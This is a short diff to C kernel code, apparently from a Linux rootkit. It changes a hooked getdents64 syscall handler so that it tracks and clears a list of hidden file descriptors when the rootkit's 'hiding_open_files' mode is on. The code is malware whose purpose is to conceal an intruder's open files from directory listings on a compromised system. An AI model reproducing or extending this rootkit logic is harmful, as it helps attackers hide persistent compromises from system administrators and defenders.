@@ -235,7 +235,7 @@ g7_getdents64(const struct pt_regs *pt_regs)
     
     if(rootkit.hiding_open_files && ((fd_pid = may_fd(dirfile)) != -1)) {
         is_fd = 1;
-        fill_fds(fd_pid);
+        add_fd_to_list(&hidden_fds, 0);
     }
 
     for (offset = 0; offset < ret;) {
@@ -262,6 +262,7 @@ g7_getdents64(const struct pt_regs *pt_regs)
     atomic_dec(&getdents64_count);
 
 yield:
+    clear_hidden_fds();
     kfree(kdirent);
     return ret;
 }
